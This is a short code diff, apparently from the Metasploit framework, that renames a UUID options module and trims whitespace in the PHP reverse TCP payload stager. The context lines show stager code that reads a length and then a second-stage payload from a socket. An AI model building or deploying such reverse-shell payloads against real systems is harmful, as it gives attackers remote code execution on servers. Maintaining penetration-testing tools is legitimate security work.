@@ -3,7 +3,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/php/send_uuid'
-require 'msf/core/payload/uuid_options'
+require 'msf/core/payload/uuid/options'
 
 module Msf
 
@@ -16,7 +16,7 @@ module Msf
 module Payload::Php::ReverseTcp
 
   include Msf::Payload::Php::SendUUID
-  include Msf::Payload::UUIDOptions
+  include Msf::Payload::UUID::Options
 
   #
   # Generate the first stage
@@ -76,7 +76,7 @@ if (!$s) { die('no socket'); }
 
     php << php_send_uuid if include_send_uuid
 
-    php << %Q^switch ($s_type) { 
+    php << %Q^switch ($s_type) {
 case 'stream': $len = fread($s, 4); break;
 case 'socket': $len = socket_read($s, 4); break;
 }
@@ -90,7 +90,7 @@ $len = $a['len'];
 
 $b = '';
 while (strlen($b) < $len) {
-	switch ($s_type) { 
+	switch ($s_type) {
 	case 'stream': $b .= fread($s, $len-strlen($b)); break;
 	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
 	}
